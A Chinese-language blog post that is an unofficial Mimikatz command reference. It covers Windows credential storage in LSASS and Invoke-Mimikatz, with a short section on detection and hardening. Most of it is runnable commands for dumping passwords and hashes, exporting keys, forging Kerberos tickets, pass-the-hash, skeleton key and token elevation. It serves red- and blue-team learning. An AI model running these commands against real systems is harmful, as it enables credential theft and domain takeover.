# 工具-Mimikatz

## 讲在前面

**非官方Mimikatz指南和命令参考，**Mimikatz命令参考版本：mimikatz [2.2.0](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200918-fix)**（x64），**页面mimikatz最后更新：2020年9月18日

以笔者所能接触到的范围内的红队和蓝队，在笔者看来真正队Mimikatz原理及所有命令了解的人屈指可数，当然这并无可厚非，在实际渗透和防御过程中大多数人的目的是实用和快速，所以命令不在于多而在于精。这篇文章将笔者能力范围之内所能整理到的Mimikatz命令全是使用一番，希望可以给红蓝两队都可以更加了解其全部功能，更加进步。

### [**Mimikatz地址**](https://github.com/gentilkiwi/mimikatz)

你可以在其github地址上找到其源代码或已经编译好的版本，同时也可以和其他提问者一起交流。当然powershell版本也已经开源：

### [**Invoke-Mimikatz.ps1**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)

## 凭证简介

为了了解Mimikatz为什么可以获得计算机上存储的各种凭证，首先我们需要简单的知道计算机上存储了那些凭证？存储在哪儿？怎么存储的？  


在用户登录计算机后，在计算机上将会生成并存储各类凭据到本地安全授权子系统服务LASS进程中。微软这样做的意义是为了方便单点登录（SSO）,用户就不需要在每次请求访问普通资源时进行身份认证。  


其中生成的凭据可能会包括但不限于Kerberos票据，NTLM-hash，LM-hash，明文密码。其中我们要特别注意的是LM-hash和明文密码这两个。微软在[Windows Server 2008和Windows Vista](https://technet.microsoft.com/en-us/magazine/2006.08.securitywatch.aspx)中已经默认不以LM加密方式在存储密码，默认为NTLM加密方式。但此选项是可以被强制开启的。同时，从Windows 8.1和Windows Server 2012 R2开始，LM加密的hash和明文密码都不会再存储在内存中，编号为[kb2871997](https://adsecurity.org/?p=559)的补丁也将此功能集成，windows早期版本安装该补丁即可。

我们可以修改如下注册表项，将其值修改为0也可以禁止将明文放在LSASS中。注意：如下为windows2016，默认没有UseLogonCredential” 项

![](https://img-blog.csdnimg.cn/2020100713450420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


作为企业管理员，对此注册表项需要保持监控，同时需要注意的一点是，Windows 8.1 / 2012 R2和更高版本没有“ UseLogonCredential” DWORD值，因此如果该选项被创建，也应视为恶意行为，应该及时告警。

## [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)

在实际渗透当中，对于攻击者而言，很少希望直接在目标机器上直接运行mimikatz，随着mimikatz的更新，目前我们可以使用其DCSync的功能，亦或者使用[PowerSploit](https://github.com/mattifestation/PowerSploit)中的[Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)来进行远程操作。

该脚本集成了Mimikatz大部分功能，脚本可以将嵌入在脚本内的Mimikatz DLL反射性的加载到内存中去，也就是说可以在不接触磁盘的情况下从内存执行代码。同时，如果脚本以特殊权限运行在启动了PowerShell Remotin权限的机器上时，还可以远程提取其他主机上的凭据，以及远程执行Mimikatz命令。

脚本需要手动更新，[更新教程](http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/)（此处未详细调研），通常[，Empire版本](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1)的[Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1)的是最新的。

### 部分命令 

> **Invoke-Mimikatz -DumpCreds       \***导出lsass进程存储的密码**\***  
>
>
> **Invoke-Mimikatz –DumpCerts       \***导出所有私人证书（即使它们被标记为不可导出）**\***  
>
>
> **Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"  \***提升特权以在远程计算机上具有调试权限**\***

## 检测Mimikatz

针对Mimikatz使用的检测，在笔者看来，目前国内外的安全软件都可以做到，但因笔者未深入研究这类安全工具的检测机制，所以不敢保证其100%的检测率。例如：Mimikatz工具因为其开源，我们可以对其进行自定义的免杀处理，包括但不限于：异或，混肴等等是都有可能绕过安全软件的。所以这里介绍几点检测意见：

* [启动LSA保护](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn408187%28v=ws.11%29?redirectedfrom=MSDN)（现在mimikatz可以通过执行“!+”来绕过） 
* 监控安全日志（你可以开启“高级审核策略配置\对象访问\审核内核对象”。这可以帮助确定从进程内存中窃取凭据的攻击）。监控powershell的活动

         1.确保所有Windows系统都具有PowerShell v3或更高版本。较新版本的PowerShell具有更好的日志记录功能，尤其是PowerShell v5。

          2.通过组策略启用PowerShell模块日志记录：计算机配置，策略，管理模板，Windows组件和Windows PowerShell，打开模块日志记录。输入"\*"，然后单击“确定”。这将记录所有PowerShell活动，包括所有PowerShell模块。

* 针对Mimikatz编写特定的检测规则，[Mimikatz的YARA规则](http://virustotal.github.io/yara/)
* 增强域内的检测力度和强度，配置好安全设备，利用其来识别与LSASS交互的软件，监控该进程。
* 设立拥有吸引力的蜜罐账户，当该账户的hash被脱取和使用时进行告警。
* 监控HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest的异常，一般情况下该项是不会轻易改动的。
* 对Kerberoasting、黄金票据、白银票据，MS14-068等漏洞的检测告警，大部分人在一般情况下都会利用mimikatz来完成这类漏洞的利用。

**注意：**  
虽然简单的做法就是识别**“ mimikatz”，“ Delpy”或“ gentilkiwi”这类的**关键字来告警Mimikatz，但要考虑到有攻击者会自行编译没有这些关键字的mimikatz  


## Mimikatz常用的命令：

> crypto::certificates –列表/导出证书  
> kerberos::golden –创建黄金/白银票据  
> kerberos::list –列出用户存储器中的所有用户票证（tgt和tgs）。不需要特殊特权，因为它仅显示当前用户的票证。类似于“ klist”的功能。  
> kerberos::ptt –通过门票。通常用于注入被盗或伪造的kerberos票证（黄金/白银/信任）。  
> lsadump::dcsync –要求dc同步对象（获取帐户的密码数据）。无需在dc上运行代码。  
> lsadump::lsa –要求lsa服务器检索sam / ad企业（正常，即时修补或注入）。用于从域控制器或lsass.dmp转储文件中转储所有active directory域凭据。也用于通过参数/ name获取特定的帐户凭据，例如krbtgt：“ / name：krbtgt”  
> lsadump::sam –获得syskey来解密sam条目（从注册表或配置单元）。sam选项连接到本地安全帐户管理器（sam）数据库，并转储本地帐户的凭据。这用于转储windows计算机上的所有本地凭据。  
> lsadump::trust –要求lsa服务器检索信任验证信息（正常或即时修补）。转储所有关联的信任（域/林）的信任密钥（密码）。  
> misc::addsid –添加到用户帐户的sidhistory。第一个值是目标帐户，第二个值是帐户/组名称（或sid）。移至sid：自2016年5月6日起修改。  
> misc::memssp –注入恶意的windows ssp来记录本地身份验证的凭据。  
> misc::skeleton –将万能钥匙插入域控制器上的lsass进程。这样，所有用户对经过skeleton key修补的dc的身份验证都可以使用“主密码”（也称为skeleton key）以及其通常的密码。  
> privilege::debug –获得调试权限（许多mimikatz命令需要此权限或“本地系统”权限）。  
> sekurlsa::ekeys –列出kerberos加密密钥  
> sekurlsa::kerberos –列出所有经过身份验证的用户（包括服务和计算机帐户）的kerberos凭据  
> sekurlsa::krbtgt –获取域kerberos服务帐户（krbtgt）密码数据  
> sekurlsa::logonpasswords –列出所有可用的提供者凭证。这通常显示最近登录的用户和计算机凭据。  
> sekurlsa::pth – pass-thehash和over-pass-the-hash  
> sekurlsa::tickets –列出所有最近通过身份验证的用户的所有可用kerberos票证，包括在用户帐户和本地计算机的ad计算机帐户的上下文中运行的服务。与kerberos::list不同，sekurlsa使用内存读取，并且不受密钥导出限制。sekurlsa可以访问其他会话（用户）的票证。  
> token::list –列出系统的所有令牌  
> token::elevate –模拟令牌。用于将权限提升为system（默认）或在框上找到域管理员令牌  
> token::elevate /domainadmin –使用domain admin凭据模拟令牌。

### 运行

运行mimikatz.exe进入交互模式执行或直接传递命令并退出，例如 ' **Mimikatz.exe "kerberos::list" exit '，**Invoke-Mimikatz没有交互模式  


### Mimikatz模块

### **​​​​​**[**standard**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-standard)\*\*\*\*

这是现在版本的主要模块，其中包含一些快捷命令，该命令有两种执行方式。例如：exit和standard::exit，这两个命令为同一个意思。  


> 命令：exit，cls，answer，coffe，sleep，log，base64，version，cd

**exit:使用完毕后退出程序**  


> mimikatz\# exit  
> Bye!

**cls：清除mimikatz屏幕**  


> mimikatz\# cls

**answer：彩蛋命令，作者用来回答关于生命、宇宙及一切的终极答案**  


> mimikatz\# answer  
> 42.

**coffe：彩蛋命令，每个安全人员都需要一杯好咖啡**  


> mimikatz \# coffee
>
>          \(     \(  
>            \)    \)  
>   .\_\_\_\_\_\_\_\_\_.  
>   \|                 \|\]  
>   \                 /  
>    \`-------------'

**sleep:休眠毫秒数（默认1000毫秒）**

> mimikatz \# sleep  
> Sleep : 1000 ms... End !
>
> mimikatz \# sleep 4200  
> Sleep : 4200 ms... End !

**log：将所有输出以日志的方式存储（默认以mimikatz.log命名存放在mimikatz.exe目录下）**  


参数名：

* `filename`-_可选_-日志文件的文件名
* `/stop`-_可选_-停止文件记录

> mimikatz \# log  
> Using 'mimikatz.log' for logfile : OK
>
> mimikatz \# log other.log  
> Using 'other.log' for logfile : OK
>
> mimikatz \# log /stop  
> Using '\(null\)' for logfile : OK

**base64：将输出内容以base64格式显示**  


> log mimi /base64:on  
> coffee

注意：这里笔者按照上述操作，未能发现输出的日志内容变为base64格式，issue也未发现类同问题，疑问？

**version:显示`mimikatz`和`Windows`的版本**

> mimikatz \# version
>
> mimikatz 2.2.0 \(arch x64\)  
> Windows NT 6.1 build 7600 \(arch x64\)  
> msvc 150030729 207

**cd:更改或显示当前目录**  


* `directory`-_可选_-您要进入的目录

> mimikatz \# cd  
> C:\Users\Administrator\Desktop\mimikatz\_trunk
>
> mimikatz \# cd ../  
> Cur: C:\Users\Administrator\Desktop\mimikatz\_trunk  
> New: C:\Users\Administrator\Desktop

### \*\*\*\*[**privilege**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-privilege)\*\*\*\*

该模块用来处理miimkatz运行权限问题，通常称为“将mimikatz提权”

> mimikatz \# privilege::debug  
> Privilege '20' OK

> 常见错误：`ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061`    
>
>
> 表示客户端未拥有所需的特权（通常您不是管理员

### \*\*\*\*[**crypto**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto) ****

Crypto Mimikatz模块提供了与Windows加密功能（[CryptoAPI](https://msdn.microsoft.com/en-us/library/ms867086.aspx)）接口的高级功能。通常的用途是导出未标记为“可导出”的证书

**providers：列出密码提供程序名**

```text
crypto::providers
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 ![](https://img-blog.csdnimg.cn/20201007154639928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​

**stores：列出密码存储区**

```text
crypto::stores
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

**参数：**

* `/systemstore`-_可选_-必须使用列表存储系统存储（默认`CERT_SYSTEM_STORE_CURRENT_USER`）， 它可以是一个：
  * `CERT_SYSTEM_STORE_CURRENT_USER` 要么 `CURRENT_USER`
  * `CERT_SYSTEM_STORE_CURRENT_USER_GROUP_POLICY` 要么 `USER_GROUP_POLICY`
  * `CERT_SYSTEM_STORE_LOCAL_MACHINE` 要么 `LOCAL_MACHINE`
  * `CERT_SYSTEM_STORE_LOCAL_MACHINE_GROUP_POLICY` 要么 `LOCAL_MACHINE_GROUP_POLICY`
  * `CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE` 要么 `LOCAL_MACHINE_ENTERPRISE`
  * `CERT_SYSTEM_STORE_CURRENT_SERVICE` 要么 `CURRENT_SERVICE`
  * `CERT_SYSTEM_STORE_USERS` 要么 `USERS`
  * `CERT_SYSTEM_STORE_SERVICES` 要么 `SERVICES`

![](https://img-blog.csdnimg.cn/20201007154731164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​

```text
crypto::stores /systemstore:local_machine
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007154836411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**sc:列出智能卡读卡器,当CSP可用时，它将尝试列出智能卡上的密钥**

```text
crypto::sc
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

**scauth:从CA创建身份验证证书（类似智能卡）**

```text
crypto::scauth /caname:administrator /upn:administrtator@pingpig.com /pfx:administrator.pfx
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

**certificates:列出证书及其密钥的属性。它也可以导出证书**

**参数：**

* `/systemstore`-_可选_-必须使用系统存储（默认：`CERT_SYSTEM_STORE_CURRENT_USER`）
* `/store`-_可选_-必须用于列出/导出证书的存储（默认值：`My`）-具有以下内容的完整列表[`crypto::stores`](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#stores)
* `/export`-_可选_-导出所有的证书文件（在公共部位`DER`，在私处`PFX`的文件-有密码保护：`mimikatz`）
* `/silent`-_可选_-如果需要用户交互，则中止
* `/nokey`-_可选_-请勿尝试与私钥进行交互

> crypto::capi  
>
>
> crypto::cng  
>
>
> crypto::certificates

![](https://img-blog.csdnimg.cn/20201007155437284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**keys:按提供程序列出密钥。它也可以导出密钥**

**参数：**

* `/provider`-_可选_-传统`CryptoAPI`提供商（默认：`MS_ENHANCED_PROV`）
* `/providertype`-_可选_-传统`CryptoAPI`提供者类型（默认值：`PROV_RSA_FULL`）
* `/cngprovider`-_可选_-的`CNG`提供商（默认：`Microsoft Software Key Storage Provider`）
* `/export`-_可选_-将所有密钥导出到`PVK`文件
* `/silent`-_可选_-如果需要用户交互，则中止

```text
crypto::keys
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007155652557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**注意：**

可以使用以下方法转换`PVK`文件：  


```text
openssl rsa -inform pvk -in key.pvk -outform pem -out key.pem
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

**capi：使不可导出的密钥可导出（不需要访问私有密钥即可，无需指定权限）**

仅当密钥提供者为以下之一时，此功能才有用：

* `Microsoft Base Cryptographic Provider v1.0`
* `Microsoft Enhanced Cryptographic Provider v1.0`
* `Microsoft Enhanced RSA and AES Cryptographic Provider`
* `Microsoft RSA SChannel Cryptographic Provider`
* `Microsoft Strong Cryptographic Provider`

可以与[`crypto::certificates`](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#certificates)和[`crypto::keys`](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#keys)`一起使用`

```text
crypto::capi
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

**hash：使用可选的用户名对密码进行哈希处理**

![](https://img-blog.csdnimg.cn/20201007160209601.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


### \*\*\*\*[**sekurlsa**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)\*\*\*\*

kerberos：列出所有经过身份验证的用户（包括服务和计算机帐户）的Kerberos凭据

```text
sekurlsa::kerberos
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007161338192.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​ 

krbtgt：获取域Kerberos服务帐户（KRBTGT）密码数据  


```text
sekurlsa::Krbtgt
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007161541460.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


logonpasswords：列出所有可用的提供者凭证。这通常显示最近登录的用户和计算机凭据。  


```text
sekurlsa::logonpasswords
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007161425338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​ 

pth:哈希传递和哈希传递（也称为密钥传递  


```text
sekurlsa::pth
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

process –切换到lsass进程上下文 

```text
sekurlsa::process
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007161355531.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​ 

ssp :列出ssp凭据  


```text
sekurlsa::ssp
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007161607760.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​ 

tickets: 列出所有最近通过身份验证的用户的所有可用Kerberos票证

```text
sekurlsa::tickets
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 ![](https://img-blog.csdnimg.cn/20201007161655950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​

trust:获取信任域密钥

```text
sekurlsa::trust
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 ![](https://img-blog.csdnimg.cn/2020100716173394.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​

tspkg:列出tspkg凭据

```text
sekurlsa::tspkg
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007161757450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​ 

wdigest:列出wdigest凭据

```text
sekurlsa::wdigest
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 ![](https://img-blog.csdnimg.cn/20201007161825328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​

msv:列出lm和ntlm凭据

```text
sekurlsa::msv
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007161853484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​ 

minidump:可以打开转储文件

```text
sekurlsa::minidump
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 转储lsass进程的方法有很多，例如： [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)，[PowerShell](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)，Task Manager等。

ekeys:列出kerberos加密密钥

```text
sekurlsa::ekeys
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007161947326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​ 

dpapisystem:dpapi\_system密钥

```text
sekurlsa::dpapisystem
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 ![](https://img-blog.csdnimg.cn/20201007162011414.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​

dpapi:列出缓存的万能钥匙

```text
sekurlsa::dpapi
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007162035856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​ 

credman:列表凭据管理器

```text
sekurlsa::credman
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007162059110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​ 

backupkeys:获取首选的备份主密钥

```text
sekurlsa::backupkeys
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007162119822.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​ 

### \*\*\*\*[**kerberos**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos)\*\*\*\*

> ptt，golden / silver，list，tgt，purge, ****Hash,PTC

**ptt:传递kirbi凭据**  


```text
kerberos::ptt c:\users\piggg\desktop\gold.kirbi /use
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

**ptc:传递ccache凭据**

```text
kerberos::ptc c:\users\piggg\desktop\gold.ccache
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

**golden / silver：黄金票据和白银票据：**  


黄金票据

白银票据

**list：列出用户存储器中的所有用户票证（TGT和TGS）。不需要特殊特权，因为它仅显示当前用户的票证。**  


```text
kerberos::list
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 ![](https://img-blog.csdnimg.cn/20201007163100315.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​

![](https://img-blog.csdnimg.cn/20201007163115450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**purge:清除所有Kerberos票证**  


```text
kerberos::purge
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007163145104.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​ 

![](https://img-blog.csdnimg.cn/20201007163153124.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**tgt:为当前用户获取当前TGT**  


```text
kerberos::tgt
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007163220394.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


### \*\*\*\*[**lsadump**](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)\*\*\*\*

该模块与Windows本地安全机构（LSA）交互以提取凭据。这些命令大多数都需要调试权限（privilege :: debug）或本地系统。默认情况下，管理员组具有调试权限。仍然必须通过运行“ privilege :: debug”来“激活”调试  


> 命令：sam, secrets, cache, lsa, trust, backupkeys, rpdata, dcsync, netsync

**backupkeys** 

```text
lsadump::backupkeys
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201007163701370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**cache：获取syskey，以system身份运行该命令**  


```text
lsadump::cache 
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

 ![](https://img-blog.csdnimg.cn/20201007164308728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​

**sam：获得syskey来解密sam，以system身份运行该命令**  


```text
privilege::debug
token::whoami
token::elevate
lsadump::sam
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

